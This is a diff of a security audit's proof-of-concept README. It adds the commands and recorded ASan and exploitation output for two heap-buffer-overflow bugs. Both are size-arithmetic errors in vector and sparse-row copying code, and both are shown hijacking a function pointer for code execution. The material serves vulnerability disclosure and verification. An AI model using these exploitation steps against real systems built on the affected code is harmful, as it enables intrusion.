@@ -101,56 +101,80 @@ hijacked address is printable) and `-no-pie` (so addresses are stable). The bug 
 demonstrated is the *arithmetic*, not the allocator; the ASan builds prove it is a real
 heap overflow against the actual `new[]`.
 
+The exact commands the Makefile runs (also runnable standalone):
+
 ```bash
-make asan   # detection
-make rce    # exploitation
+# detection (ASan aborts on the OOB write)
+g++ -g -O0 -fsanitize=address poc_c1_asan.cpp -o c1_asan && ASAN_OPTIONS=abort_on_error=0 ./c1_asan
+g++ -g -O0 -fsanitize=address poc_c2_asan.cpp -o c2_asan && ASAN_OPTIONS=abort_on_error=0 ./c2_asan
+# exploitation (control-flow hijack; -no-pie for stable addresses)
+g++ -g -O0 -no-pie poc_c1_rce.cpp -o c1_rce && ./c1_rce
+g++ -g -O0 -no-pie poc_c2_rce.cpp -o c2_rce && ./c2_rce
 ```
 
 ### Recorded output
 
+The **complete, unedited transcript** (full ASan dumps incl. shadow bytes, stack traces,
+and the exact commands) is in [`RUN_LOG.md`](./RUN_LOG.md). Key lines:
+
 **C1 ASan** — 32-byte write past a 1-byte region, allocated at `new float[length_*dim_]`:
 
-```
-==ERROR: AddressSanitizer: heap-buffer-overflow ...
+```console
+$ g++ -g -O0 -fsanitize=address poc_c1_asan.cpp -o c1_asan
+$ ASAN_OPTIONS=abort_on_error=0 ./c1_asan
+==7560==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000011 ...
 WRITE of size 32 at 0x502000000011 thread T0
     #0 memcpy
-    #1 VectorArray_float_branch(...) poc_c1_asan.cpp:27
+    #1 VectorArray_float_branch(VectorFieldProto const&) poc_c1_asan.cpp:27
 0x502000000011 is located 0 bytes after 1-byte region [0x502000000010,0x502000000011)
 allocated by thread T0 here:
     #0 operator new[](unsigned long)
-    #1 VectorArray_float_branch(...) poc_c1_asan.cpp:25   ->  new float[length_*dim_]
+    #1 VectorArray_float_branch(VectorFieldProto const&) poc_c1_asan.cpp:25   ->  new float[length_*dim_]
+SUMMARY: AddressSanitizer: heap-buffer-overflow ... in memcpy
+==7560==ABORTING
 ```
 
 **C2 ASan** — 13-byte write past an 8-byte region, allocated at `SparseRow::SparseRow`:
 
-```
-==ERROR: AddressSanitizer: heap-buffer-overflow ...
+```console
+$ g++ -g -O0 -fsanitize=address poc_c2_asan.cpp -o c2_asan
+$ ASAN_OPTIONS=abort_on_error=0 ./c2_asan
+==7566==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000018 ...
 WRITE of size 13 at 0x502000000018 thread T0
     #0 memcpy
-    #1 CopyAndWrapSparseRow(...) poc_c2_asan.cpp:28
+    #1 CopyAndWrapSparseRow(void const*, unsigned long, bool) poc_c2_asan.cpp:28
 0x502000000018 is located 0 bytes after 8-byte region [0x502000000010,0x502000000018)
 allocated by thread T0 here:
     #0 operator new[](unsigned long)
     #1 SparseRow::SparseRow(unsigned long) poc_c2_asan.cpp:17
+SUMMARY: AddressSanitizer: heap-buffer-overflow ... in memcpy
+==7566==ABORTING
 ```
 
 **C1 RCE** — full 8-byte pointer overwrite (attacker controls size *and* content):
 
-```
+```console
+$ g++ -g -O0 -no-pie poc_c1_rce.cpp -o c1_rce
+$ ./c1_rce
 [C1] before call: victim->handler = 0x40134c (legit=0x401332, win=0x40134c)
 [C1] *** win() executed via hijacked pointer — arbitrary code exec ***
+[C1]     (a real exploit would exec /bin/sh here)
 ```
 
 **C2 RCE** — 5-byte *partial* pointer overwrite; only redirects when high bytes align:
 
-```
+```console
+$ g++ -g -O0 -no-pie poc_c2_rce.cpp -o c2_rce
+$ ./c2_rce
 [C2] &legit=0x4011d2  &win=0x4011ec  high-3-bytes match: yes (hijack viable)
+[C2] before call: victim->handler = 0x4011ec
 [C2] *** win() executed via partially-overwritten pointer — code exec ***
 ```
 
 C1 overwrites the **full** pointer with any address (target-independent). C2 reaches only
 **5 bytes**, so it is a partial overwrite that redirects only when the target shares its
 high bytes with the original (same `.text`) — this is why the audit rates C2 "limited RCE."
+(ASan `0x...` addresses, PIDs, and BuildIds vary per run; the sizes and outcomes do not.)
 
 ---
 
